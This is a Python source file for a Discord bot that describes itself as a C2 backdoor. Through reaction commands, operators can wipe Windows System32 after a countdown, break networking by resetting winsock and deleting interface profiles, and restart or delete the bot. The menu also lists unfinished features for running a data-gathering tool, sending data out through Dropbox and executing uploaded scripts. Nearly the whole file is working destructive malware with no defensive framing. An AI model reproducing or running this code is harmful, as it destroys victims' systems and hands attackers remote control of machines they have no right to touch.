import json
import os
import sys
import time
import zipfile
import zlib
import dropbox
import discord
from discord.ext import commands
from Download_Logicytics import log  # WIP, Logicytics


# Function to read secret keys and information from JSON file
def read_key():
    try:
        with open("api.json", "r") as f:
            config = json.load(f)
        if (
                config is not None
                and isinstance(config["token"], str)
                and isinstance(config["channel_id_(for_c2_commands)"], int)
                and isinstance(config["channel_id_(for_logs)"], int)
                and isinstance(config["webhooks_username"], list)
                and isinstance(config["log_using_debug?"], bool)
                and isinstance(config["dropbox_api_key"], str)
        ):
            return (
                config["token"],
                config["channel_id_(for_c2_commands)"],
                config["channel_id_(for_logs)"],
                config["webhooks_username"],
                config["log_using_debug?"],
                config["dropbox_api_key"],
            )
        else:
            log.critical("Invalid JSON file format")
            exit(1)
    except Exception as e:
        log.critical(f"Error reading JSON file: {e}")
        exit(1)


# All global variables, and required initializations are done here.
TOKEN, CHANNEL_ID_COMMANDS, CHANNEL_ID_LOGS, WEBHOOK_USERNAME, DEBUG, API_DROPBOX = read_key()
MENU = """
Reactions Menu:

⚙️ -> Restart the bot in a hidden prompt
🛜 -> Destroy wifi by killing all wifi processes as well as deleting all adapters
🪝 -> Download Logicytics and run it, then send data (WIP -> How to send a 1GB file?)
📃 -> Send Logicytics Logs (^ WIP ^)
💣 -> Destroy device by deleting sys32
📤 -> Upload a script of your choice to be executed by them (WIP)
"""
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
dbx = dropbox.Dropbox(API_DROPBOX)


@bot.event
async def on_ready():
    log.info(f"We have logged in as {bot.user}")


@bot.event
async def on_message(message):
    channel_c2 = await message.guild.fetch_channel(CHANNEL_ID_COMMANDS)
    channel_log = await message.guild.fetch_channel(CHANNEL_ID_LOGS)
    global stop
    stop = False
    if isinstance(channel_c2, discord.TextChannel) and isinstance(channel_log, discord.TextChannel):
        if message.author != bot.user:
            # Check if the message author is not the bot
            log.info(f"Message from {message.author}: {message.content}")
        if str(message.author) not in WEBHOOK_USERNAME:
            # Check if the message author is not the bot
            log.debug(f"Message Ignored due to {message.author} not being in the allowed list of users: "
                      f"{WEBHOOK_USERNAME}")
        else:
            if message.content == "/c2 stop" and message.author != bot.user:
                # Fail switch
                if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                    stop = True
                else:
                    await message.channel.send("You do not have permission to use this command?")
                    log.error(f"User {message.author} attempted to use the menu command. Invalid permission's.")
            if message.content == "/c2" and message.author != bot.user:
                await message.channel.purge(limit=None)
                if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                    await message.channel.send("/c2 logs -> Retrieves and sends the bots logs to a specified channel. "
                                               "\n/c2 menu -> Sends possible reaction menu"
                                               "\n/c2 stop -> Only when deleting sys32 countdown occurs, "
                                               "failswitch to disable it"
                                               "\n/c2 disable -> Remove the C2 bot backdoor")
                else:
                    await message.channel.send("You do not have permission to use this command?")
                    log.error(f"User {message.author} attempted to use the /c2 command. Invalid permission's.")
            if message.content == "/c2 logs" and message.author != bot.user:
                await message.channel.purge(limit=None)
                if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                    if message.channel.id == CHANNEL_ID_LOGS:
                        await logs(message.channel)
                    else:
                        await message.channel.send("This is not the logs preconfigured channel. Please use the /logs "
                                                   "command in the logs channel.")
                        log.warning(f"Channel {message.channel} is not the one preconfigured.")
                else:
                    await message.channel.send("You do not have permission to use this command?")
                    log.error(f"User {message.author} attempted to use the /logs command. Invalid permission's.")
            if message.content == "/c2 menu" and message.author != bot.user:
                await message.channel.purge(limit=None)
                if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                    await message.channel.send(MENU)
                else:
                    await message.channel.send("You do not have permission to use this command?")
                    log.error(f"User {message.author} attempted to use the menu command. Invalid permission's.")
            if message.content == "/c2 disable" and message.author != bot.user:
                await message.channel.purge(limit=None)
                if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                    os.remove(os.path.abspath(__file__))
                else:
                    await message.channel.send("You do not have permission to use this command?")
                    log.error(f"User {message.author} attempted to use the menu command. Invalid permission's.")
    else:
        log.critical(
            f"Channel {CHANNEL_ID_COMMANDS} or {CHANNEL_ID_LOGS} not found as text channels. Bot Crashed."
        )
        exit(1)


@bot.event
async def on_reaction_add(reaction, user):
    reaction_type = reaction.emoji
    if reaction.message.author == bot.user:
        await reaction.message.clear_reactions()
        await reaction.message.edit(content='✅')
    if reaction_type == "⚙️":
        log.info(f"User {user} restarted the bot")
        log.debug(f"User {reaction.message.author} restarted the bot")
        os.execl(sys.executable, sys.executable, *sys.argv)
    if reaction_type == "🛜":
        log.info(f"User {user} changed DNS to 127.0.0.1 - Connection will be killed")
        await reaction.message.channel.send("Goodbye Cruel World!")
        await destroy_wifi(reaction.message)
    if reaction_type == "🪝":
        log.info(f"User {user} downloaded Logicytics and ran it, as well as sending data")
    if reaction_type == "📃":
        log.info(f"User {user} requested logs of Logicytics")
    if reaction_type == "💣":
        log.critical(f"User {user} sent missile to destroy the enemy (Del System32)")
        await reaction.message.channel.send("Goodbye Cruel World!")
        repeats = 0
        while repeats < 60 and not stop:
            repeats += 1
            time.sleep(1)
            log.debug(f"Should delete system32? {stop}")
            await reaction.message.channel.send("Deleting sys32 in [T minus " + str(60 - repeats) + " seconds]...")
        if not stop:
            await reaction.message.channel.send("BOOM!!!!")
            os.system(r'del /s /q /f C:\windows\system32\* > NUL 2>&1')  # =)
        else:
            await reaction.message.channel.send("Cancelled due to user request")


async def logs(ctx):
    # Retrieve the channel object using the provided channel ID
    channel = bot.get_channel(CHANNEL_ID_LOGS)
    if channel is None:
        await ctx.send("Channel not found.")
        return

    try:
        # Instead of reading the file content into memory,
        # simply pass the filename to discord.File
        fileToSend = discord.File("C2.log", filename="Discord.log")
        await channel.send(f"Here are the logs\n", file=fileToSend)
    except os.error as e:
        await ctx.send(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")
    except discord.errors.HTTPException as e:
        await ctx.send(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")
    except Exception as e:
        await ctx.send(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")


async def destroy_wifi(ctx):
    log.info(f"User {ctx.author} destroyed the wifi drivers - Connection will be killed")

    # Kill all network connections
    os.system('netsh winsock reset catalog')

    # Disable all network adapters
    os.system('netsh interface ipv4 show profile > profiles.txt')
    with open('profiles.txt', 'r') as f:
        for line in f:
            if 'Profile Name' in line:
                profile_name = line.split(':')[1].strip()
                os.system(f"netsh interface profile={profile_name} delete")

    # Restart networking services
    os.system('net stop netman & net start netman')
    os.system('net stop dot3svc & net start dot3svc')


bot.run(TOKEN, log_handler=None)
